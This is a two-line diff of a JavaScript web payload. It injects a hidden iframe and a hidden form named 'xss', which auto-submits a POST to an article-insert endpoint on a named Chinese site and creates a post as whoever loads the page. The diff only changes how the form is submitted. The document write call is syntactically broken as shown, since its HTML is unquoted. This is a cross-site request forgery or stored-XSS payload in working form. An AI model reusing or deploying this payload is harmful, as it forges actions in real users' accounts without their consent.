@@ -1,2 +1,2 @@
 document.write(<iframe name="hidden_frame" id="hidden_frame" style="display:none"></iframe><form action="http://lib.uir.cn/ucenter/article/do.jsp" method="post" enctype="application/x-www-form-urlencoded" name="xss" target="hidden_frame"><input type="hidden" name="title" value="%E6%B5%8B%E8%AF%95" /><input type="hidden" name="categoryId" value="4028813a3947376e01394746f9fc0003" /><input type="hidden" name="userCategoryId" value="0" /><input type="hidden" name="content" value="%3Cp%3E%0D%0A%09%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%3C%2Fp%3E%0D%0A" /><input type="hidden" name="type" value="insert" /><input type="hidden" name="id" value="" /></form>);
-document.forms[xss].submit();
+xss.submit();
